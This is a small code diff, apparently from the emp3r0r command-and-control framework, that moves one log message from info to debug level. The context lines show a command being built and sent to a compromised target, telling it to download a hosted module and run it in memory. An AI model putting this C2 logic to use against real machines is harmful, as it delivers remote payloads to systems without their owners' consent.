@@ -99,7 +99,7 @@ func handleInMemoryModule(config emp3r0r_def.ModConfig, payload_type, download_a
 	cmd := fmt.Sprintf("%s --mod_name %s --type %s --file_to_download %s --checksum %s --in_mem --download_addr %s",
 		emp3r0r_def.C2CmdCustomModule, CurrentMod, payload_type, util.FileBaseName(hosted_file), tun.SHA256SumFile(hosted_file), download_addr)
 	cmd_id := uuid.NewString()
-	CliPrintInfo("Sending command %s to %s", cmd, CurrentTarget.Tag)
+	CliPrintDebug("Sending command %s to %s", cmd, CurrentTarget.Tag)
 	err = SendCmdToCurrentTarget(cmd, cmd_id)
 	if err != nil {
 		CliPrintError("Sending command %s to %s: %v", cmd, CurrentTarget.Tag, err)
